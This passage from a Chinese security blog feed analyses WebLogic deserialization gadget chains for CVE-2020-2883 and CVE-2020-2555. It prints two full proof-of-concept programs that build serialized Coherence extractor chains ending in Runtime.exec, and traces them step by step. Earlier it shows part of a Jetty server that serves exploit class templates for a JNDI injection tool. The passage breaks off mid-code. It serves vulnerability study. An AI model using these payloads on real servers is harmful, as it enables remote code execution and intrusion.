[JETTYSERVER]&gt;&gt; Log a request to "</span> + request.getRequestURL());</span><br><span class="line">                response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">                response.setHeader(<span class="string">"content-disposition"</span>, <span class="string">"attachment;filename="</span>+URLEncoder.encode(filename, <span class="string">"UTF-8"</span>));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> len ;</span><br><span class="line">                <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                OutputStream out = response.getOutputStream();</span><br><span class="line">                <span class="keyword">if</span> (bain != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">while</span> ((len = bain.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        out.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">                    &#125;</span><br><span class="line">                    bain.close();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; Read file error!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; URL("</span>+ request.getRequestURL() +<span class="string">") Not Exist!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">            doGet(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@description</span> 检查请求的是ExecTemplateJDK7.class还是ExecTemplateJDK8.class，获取相应的类模板字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filename</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InputStream <span class="title">checkFilename</span><span class="params">(String filename)</span></span>&#123;</span><br><span class="line">        String template;</span><br><span class="line">        <span class="keyword">switch</span> (filename)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"ExecTemplateJDK7.class"</span>:</span><br><span class="line">                template = <span class="string">"template/ExecTemplateJDK7.class"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"ExecTemplateJDK8.class"</span>:</span><br><span class="line">                template = <span class="string">"template/ExecTemplateJDK8.class"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// <span class="doctag">TODO:</span>Add more</span></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Thread.currentThread().getContextClassLoader().getResourceAsStream(template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="jndi：LDAPRefServer-java；RMIRefServer-java"><a href="#jndi：LDAPRefServer-java；RMIRefServer-java" class="headerlink" title="jndi：LDAPRefServer,java；RMIRefServer.java"></a>jndi：LDAPRefServer,java；RMIRefServer.java</h3><h3 id="RMIRefServer-java"><a href="#RMIRefServer-java" class="headerlink" title="RMIRefServer.java"></a>RMIRefServer.java</h3><p>参考链接：</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit/" target="_blank" rel="noopener">welk1n/JNDI-Injection-Exploit</a></p><p><a href="https://juejin.im/post/6844903993060098055" target="_blank" rel="noopener">字节码增强之ASM</a></p><p><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html" target="_blank" rel="noopener">Java字节码增强探秘</a></p><p><a href="https://zhenbianshu.github.io/2018/11/control_jvm_byte_code.html" target="_blank" rel="noopener">Java 动态字节码技术</a></p><p><a href="https://www.jianshu.com/p/088277390eb4" target="_blank" rel="noopener">Jetty篇教程 之Jetty 嵌入式服务器</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> JNDI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555</title>
      <link href="2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/"/>
      <url>2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/MagicZer0/Weblogic_CVE-2020-2883_POC" target="_blank" rel="noopener">MagicZer0/Weblogic_CVE-2020-2883_POC</a>给出的两个利用链分别如下</p><p>Gadget1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.coherence.reporter.extractor.ConstantExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.ValueExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.comparator.ExtractorComparator;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * java.util.PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment"> *   java.util.PriorityQueue.heapify()</span></span><br><span class="line"><span class="comment"> *   java.util.PriorityQueue.siftDown()</span></span><br><span class="line"><span class="comment"> *   java.util.PriorityQueue.siftDownUsingComparator()</span></span><br><span class="line"><span class="comment"> *   com.tangosol.util.extractor.AbstractExtractor.compare()</span></span><br><span class="line"><span class="comment"> *     com.tangosol.util.extractor.MultiExtractor.extract()</span></span><br><span class="line"><span class="comment"> *       com.tangosol.util.extractor.ChainedExtractor.extract()</span></span><br><span class="line"><span class="comment"> *         //...</span></span><br><span class="line"><span class="comment"> *         Method.invoke()</span></span><br><span class="line"><span class="comment"> *             //...</span></span><br><span class="line"><span class="comment"> *           Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gadget1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String command = <span class="string">"calc"</span>;</span><br><span class="line">        ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantExtractor(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new ReflectionExtractor("getMethod", new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;command&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedExtractor chainedExtractor = <span class="keyword">new</span> ChainedExtractor(valueExtractors);</span><br><span class="line"></span><br><span class="line">        ExtractorComparator extractorComparator = <span class="keyword">new</span> ExtractorComparator&lt;Object&gt;();</span><br><span class="line">        Field m_extractor = extractorComparator.getClass().getDeclaredField(<span class="string">"m_extractor"</span>);</span><br><span class="line">        m_extractor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_extractor.set(extractorComparator, chainedExtractor);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">        priorityQueue.add(<span class="string">"foo"</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">"bar"</span>);</span><br><span class="line"></span><br><span class="line">        Field comparator = priorityQueue.getClass().getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, extractorComparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Gadget2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.coherence.reporter.extractor.ConstantExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.internal.sleepycat.persist.evolve.Mutations;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.ValueExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.comparator.ExtractorComparator;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentNavigableMap;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentSkipListMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * javax.management.BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment"> *   com.tangosol.internal.sleepycat.persist.evolve.Mutations.toString()</span></span><br><span class="line"><span class="comment"> *     java.util.concurrent.ConcurrentSkipListMap$SubMap.size()</span></span><br><span class="line"><span class="comment"> *     java.util.concurrent.ConcurrentSkipListMap$SubMap.isBeforeEnd()</span></span><br><span class="line"><span class="comment"> *       java.util.concurrent.ConcurrentSkipListMap.cpr()</span></span><br><span class="line"><span class="comment"> *         com.tangosol.util.comparator.ExtractorComparator.compare()</span></span><br><span class="line"><span class="comment"> *           com.tangosol.util.extractor.ChainedExtractor.extract()</span></span><br><span class="line"><span class="comment"> *           com.tangosol.util.extractor.ReflectionExtractor().extract()</span></span><br><span class="line"><span class="comment"> *             Method.invoke()</span></span><br><span class="line"><span class="comment"> *             //...</span></span><br><span class="line"><span class="comment"> *           com.tangosol.util.extractor.ReflectionExtractor().extract()</span></span><br><span class="line"><span class="comment"> *             Method.invoke()</span></span><br><span class="line"><span class="comment"> *               Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gadget2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String command = <span class="string">"calc"</span>;</span><br><span class="line">        ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantExtractor(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new ReflectionExtractor("getMethod", new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;command&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedExtractor chainedExtractor = <span class="keyword">new</span> ChainedExtractor(valueExtractors);</span><br><span class="line"></span><br><span class="line">        ExtractorComparator extractorComparator = <span class="keyword">new</span> ExtractorComparator&lt;Object&gt;();</span><br><span class="line">        Field m_extractor = extractorComparator.getClass().getDeclaredField(<span class="string">"m_extractor"</span>);</span><br><span class="line">        m_extractor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_extractor.set(extractorComparator, chainedExtractor);</span><br><span class="line"></span><br><span class="line">        ConcurrentSkipListMap concurrentSkipListMap = <span class="keyword">new</span> ConcurrentSkipListMap&lt;String, String&gt;();</span><br><span class="line">        Field comparator = concurrentSkipListMap.getClass().getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator.set(concurrentSkipListMap, extractorComparator);</span><br><span class="line"></span><br><span class="line">        ConcurrentNavigableMap subMap = concurrentSkipListMap.subMap(<span class="string">"foo"</span>, <span class="keyword">false</span>, <span class="string">"bar"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// crafted Mutations Object</span></span><br><span class="line">        Mutations mutations = <span class="keyword">new</span> Mutations();</span><br><span class="line">        Field renamers = mutations.getClass().getDeclaredField(<span class="string">"renamers"</span>);</span><br><span class="line">        renamers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        renamers.set(mutations, subMap);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, mutations);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(val);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Gadget1分析"><a href="#Gadget1分析" class="headerlink" title="Gadget1分析"></a>Gadget1分析</h2><p>因为之前分析过CommonsCollections利用链，有了经验，所以分析起来也更简单一点。还跟之前一样，分三部分来分析。</p><h3 id="第一部分：命令执行链"><a href="#第一部分：命令执行链" class="headerlink" title="第一部分：命令执行链"></a>第一部分：命令执行链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">      String command = <span class="string">"calc"</span>;</span><br><span class="line">      ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">              <span class="keyword">new</span> ConstantExtractor(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">              new ReflectionExtractor("getMethod", new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">              <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">              <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;command&#125;)</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      ChainedExtractor chainedExtractor = <span class="keyword">new</span> ChainedExtractor(valueExtractors);</span><br><span class="line"></span><br><span class="line">ExtractorComparator extractorComparator = <span class="keyword">new</span> ExtractorComparator&lt;Object&gt;();</span><br><span class="line">      Field m_extractor = extractorComparator.getClass().getDeclaredField(<span class="string">"m_extractor"</span>);</span><br><span class="line">      m_extractor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      m_extractor.set(extractorComparator, chainedExtractor);</span><br></pre></td></tr></table></figure><p>这部分都是跟ValueExtractor相关的，跟CommonsCollections类似，只不过之前CommonsCollections是利用的Transformer。先分析下ValueExtractor、ConstantExtractor、ReflectionExtractor、ChainedExtractor，除了用到了构造方法，Gagdet里面提到了extract()，所以我们每个类的extract()都分析下。</p><p><img src="/imgs/image-20200805095214818.png" alt="ValueExtractor继承关系"></p><table><thead><tr><th>类名</th><th>方法及用途</th></tr></thead><tbody><tr><td>ConstantExtractor</td><td>ConstantExtractor(Object oValue)：构造方法，主要将参数值赋给属性m_oConstant；<br>extract(Object oTarget)：返回属性m_oConstant值</td></tr><tr><td>ReflectionExtractor</td><td>ReflectionExtractor(String sMethod, Object[] aoParam)：调用ReflectionExtractor(String sMethod, Object[] aoParam, int nTarget)，参数值方法名、参数类型等赋值属性；<br>extract(T oTarget)：调用method.invoke(oTarget, this.m_aoParam) 利用反射调用方法</td></tr><tr><td>ChainedExtractor</td><td>ChainedExtractor(@JsonbProperty(“extractors”) ValueExtractor[] aExtractor)：构造函数，赋值给属性ValueExtractor[] aExtractor；<br>extract(Object oTarget)：依次调用oTarget = aExtractor[i].extract(oTarget)，即<strong>依次调用</strong>每个ValueExtractor的extract，<strong>而且将上次调用的结果作为参数</strong></td></tr></tbody></table><p>通过了解以上类即涉及方法，我们第一部分也清楚了：通过ChainedExtractor.extract()可以依次调用oTarget = aExtractor[i].extract(oTarget)，因为上次的结果是本次extract()的参数，从而形成了执行链：Runtime.getRuntime().exec(“calc”)。</p><p>继续往下，这里很清楚，就是将extractorComparator的m_extractor属性设置为chainedExtractor，相当于extractorComparator.m_extractor=chainedExtractor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ExtractorComparator extractorComparator = <span class="keyword">new</span> ExtractorComparator&lt;Object&gt;();</span><br><span class="line">      Field m_extractor = extractorComparator.getClass().getDeclaredField(<span class="string">"m_extractor"</span>);</span><br><span class="line">      m_extractor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      m_extractor.set(extractorComparator, chainedExtractor);</span><br></pre></td></tr></table></figure><h3 id="第二部分："><a href="#第二部分：" class="headerlink" title="第二部分："></a>第二部分：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">      priorityQueue.add(<span class="string">"foo"</span>);</span><br><span class="line">      priorityQueue.add(<span class="string">"bar"</span>);</span><br><span class="line"></span><br><span class="line">      Field comparator = priorityQueue.getClass().getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">      comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      comparator.set(priorityQueue, extractorComparator);</span><br></pre></td></tr></table></figure><p>这部分很简单，将priorityQueue的comparator设置为extractorComparator。</p><h3 id="第三部分：触发命令执行"><a href="#第三部分：触发命令执行" class="headerlink" title="第三部分：触发命令执行"></a>第三部分：触发命令执行</h3><p>ois.readObject()调用priorityQueue.readObject()，我们在这里ois.readObject()和priorityQueue.readObject()打上断点分析下：</p><p><img src="/imgs/image-20200805105654502.png" alt="image-20200805105654502"></p><p>priorityQueue.readObject()调用heapify()</p><p><img src="/imgs/image-20200805111353750.png" alt="image-20200805111353750"></p><p>跟进heapify()，调用siftDown(i, (E) queue[i])</p><p><img src="/imgs/image-20200805111542794.png" alt="image-20200805111542794"></p><p>跟进siftDown()，会去调用siftDownUsingComparator(k, x)</p><p><img src="/imgs/image-20200805112401081.png" alt="image-20200805112401081"></p><p>跟进siftDownUsingComparator(k, x)，调用comparator.compare(x, (E) c)，这里的comparator就是我们之前第二部分的extractorComparator，那么这里其实就是去调用ExtractorComparator.compare(“bar”,”foo”)</p><p><img src="/imgs/image-20200805113829218.png" alt="image-20200805113829218"></p><p>ExtractorComparator.compare()调用chainedExtractor.extract()从而完成整个利用链。</p><p><img src="/imgs/image-20200805123552569.png" alt="image-20200805123552569"></p><p>梳理下反序列化执行命令的整个过程就是：</p><p>ois.readObject()调用priorityQueue.readObject()，然后通过PriorityQueue.heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()-&gt;ExtractorComparator.compare()-&gt;ChainedExtractor.extract()，ChainedExtractor.extract()调用命令执行链，从而完成命令执行。</p><h2 id="Gadget2分析"><a href="#Gadget2分析" class="headerlink" title="Gadget2分析"></a>Gadget2分析</h2><p>第一部分跟Gadget1一样，这里不再赘述，直接开始分析下面代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// concurrentSkipListMap.comparator = extractorComparator</span></span><br><span class="line">ConcurrentSkipListMap concurrentSkipListMap = <span class="keyword">new</span> ConcurrentSkipListMap&lt;String, String&gt;();</span><br><span class="line">Field comparator = concurrentSkipListMap.getClass().getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">comparator.set(concurrentSkipListMap, extractorComparator);</span><br><span class="line"></span><br><span class="line">ConcurrentNavigableMap subMap = concurrentSkipListMap.subMap(<span class="string">"foo"</span>, <span class="keyword">false</span>, <span class="string">"bar"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mutations.renamers = subMap</span></span><br><span class="line">Mutations mutations = <span class="keyword">new</span> Mutations();</span><br><span class="line">Field renamers = mutations.getClass().getDeclaredField(<span class="string">"renamers"</span>);</span><br><span class="line">renamers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">renamers.set(mutations, subMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// val.val = mutations</span></span><br><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valfield.set(val, mutations);</span><br></pre></td></tr></table></figure><p>调用ois.readObject()，BadAttributeValueExpException有readObject()，所以会调用val.readObject()</p><p>BadAttributeValueExpException.readObject()获取到BadAttributeValueExpException对象这里是val的val属性值，也就是mutations，然后去调用mutations.toString()</p><p><img src="/imgs/image-20200805141002717.png" alt="image-20200805141002717"></p><p>Mutations.toString()调用了subMap.size()</p><p><img src="/imgs/image-20200805141550303.png" alt="image-20200805141550303"></p><p>subMap.size()调用subMap.isBeforeEnd(n, cmp)</p><p><img src="/imgs/image-20200805142434559.png" alt="image-20200805142434559"></p><p>继续看下subMap.isBeforeEnd(n, cmp)，调用cpr()</p><p><img src="/imgs/image-20200805144053498.png" alt="image-20200805144053498"></p><p>cpr()调用concurrentSkipListMap.comparator的compare()即extractorComparator.compare()</p><p><img src="/imgs/image-20200805144240793.png" alt="image-20200805144240793"></p><p>然后后面跟Gadget1一样了通过extractorComparator.compare()调用chainedExtractor.extract()从而触发命令执行。</p><h2 id="CVE-2020-2555-Gadget分析"><a href="#CVE-2020-2555-Gadget分析" class="headerlink" title="CVE-2020-2555 Gadget分析"></a>CVE-2020-2555 Gadget分析</h2><p>CVE-2020-2883是绕过了CVE-2020-2555的补丁，这里也简单分析下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 